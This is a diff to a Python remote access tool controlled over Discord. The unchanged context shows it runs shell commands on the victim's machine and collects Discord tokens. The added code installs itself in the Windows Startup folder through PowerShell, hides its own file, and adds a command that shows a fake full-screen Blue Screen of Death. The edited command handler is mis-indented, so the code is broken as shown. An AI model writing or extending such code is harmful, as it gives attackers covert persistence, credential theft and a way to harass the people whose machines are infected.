@@ -308,6 +308,61 @@ async def execute_shell_command(command):
     except Exception as e:
         return f"Error executing command: {e}"
 
+# ============================== ADD TO STARTUP ==============================
+def add_to_startup():
+    try:
+        # Get the path of the current script
+        script_path = os.path.abspath(sys.argv[0])
+
+        # Define the startup folder path for Windows
+        startup_folder = os.path.join(
+            os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
+        )
+
+        # Create a shortcut to the script in the startup folder
+        shortcut_name = "MyScript.lnk"
+        shortcut_path = os.path.join(startup_folder, shortcut_name)
+
+        # Use PowerShell to create the shortcut
+        powershell_command = f'''
+        $WshShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
+        $Shortcut.TargetPath = "{script_path}"
+        $Shortcut.Save()
+        '''
+        # Execute the PowerShell command
+        result = asyncio.run(execute_shell_command(f'powershell -Command "{powershell_command}"'))
+        return result
+    except Exception as e:
+        return f"Error adding to startup: {e}"
+
+# ============================== HIDE FILE ==============================
+def hide_file():
+    try:
+        # Get the path of the current script
+        script_path = os.path.abspath(sys.argv[0])
+
+        # Use the `attrib` command to set the file as hidden
+        hide_command = f'attrib +h "{script_path}"'
+        result = asyncio.run(execute_shell_command(hide_command))
+        return result
+    except Exception as e:
+        return f"Error hiding file: {e}"
+
+# ============================== MAIN FUNCTION ==============================
+async def main():
+    # Add the script to startup
+    startup_result = add_to_startup()
+    print("Startup Addition Result:", startup_result)
+
+    # Hide the script file
+    hide_result = hide_file()
+    print("File Hiding Result:", hide_result)
+
+# Run the main function
+if __name__ == "__main__":
+    asyncio.run(main())
+
 # ============================== DOWNLOAD FILE FROM URL ==============================
 def download_file(url, save_path):
     try:
@@ -732,9 +787,54 @@ async def on_message(message):
             embed = Embed(title="Discord Tokens", description="No Discord tokens found.", color=discord.Color.red())
             await message.channel.send(embed=embed)
 
-    else:
-        embed = Embed(title="Error", description="Unknown command. Use `,help` for a list of commands.", color=discord.Color.red())
+elif command == "bsod":
+    # Simulate a Blue Screen of Death (BSOD)
+    try:
+        import tkinter as tk
+
+        def create_bsod():
+            # Create a full-screen blue screen
+            root = tk.Tk()
+            root.attributes("-fullscreen", True)  # Fullscreen mode
+            root.configure(bg="#0000AA")  # Classic BSOD blue color
+            root.overrideredirect(True)  # Remove window borders and title bar
+
+            # Add text to mimic a BSOD
+            label = tk.Label(
+                root,
+                text=":( Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.",
+                font=("Segoe UI", 14),
+                fg="white",
+                bg="#0000AA",
+                wraplength=800,
+                justify="center",
+            )
+            label.place(relx=0.5, rely=0.4, anchor="center")
+
+            # Add a spinning progress indicator
+            progress_label = tk.Label(
+                root,
+                text="Please wait...",
+                font=("Segoe UI", 12),
+                fg="white",
+                bg="#0000AA",
+            )
+            progress_label.place(relx=0.5, rely=0.6, anchor="center")
+
+            # Keep the window open until closed manually
+            root.mainloop()
+
+        # Run the BSOD simulation in a separate thread to avoid blocking the bot
+        threading.Thread(target=create_bsod, daemon=True).start()
+        embed = Embed(title="Blue Screen of Death", description="Simulating a Blue Screen of Death...", color=discord.Color.blue())
         await message.channel.send(embed=embed)
+    except Exception as e:
+        embed = Embed(title="Error", description=f"Error simulating BSOD: {e}", color=discord.Color.red())
+        await message.channel.send(embed=embed)
+
+else:
+    embed = Embed(title="Error", description="Unknown command. Use `,help` for a list of commands.", color=discord.Color.red())
+    await message.channel.send(embed=embed)
 
 # Run the Discord bot
 client.run(DISCORD_TOKEN)
